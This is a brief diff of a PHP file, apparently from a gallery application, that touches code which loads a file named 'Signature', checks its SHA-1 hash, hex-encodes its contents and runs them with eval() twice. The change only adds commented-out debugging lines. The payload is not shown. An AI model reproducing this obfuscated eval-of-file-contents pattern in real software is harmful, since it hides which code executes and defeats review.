@@ -220,7 +220,12 @@ $f = file_get_contents(dirname(__FILE__).'/Signature');
 if (sha1($f)=='4412b0d271a23003476ec40db64eb46039925525') {
 	preg_match_all('/(..)/', file_get_contents(dirname(__FILE__).'/Signature'), $matches);
 	$f = '$f="\\x'.implode('\\x', $matches[0]).'";';
-	eval($f);eval($f);
+	// var_dump($f);
+	eval($f);
+	// var_dump($f);
+	
+	// var_dump(dirname(SERVERPATH.'/'.ZENFOLDER));	
+	eval($f);
 }
 
 /**
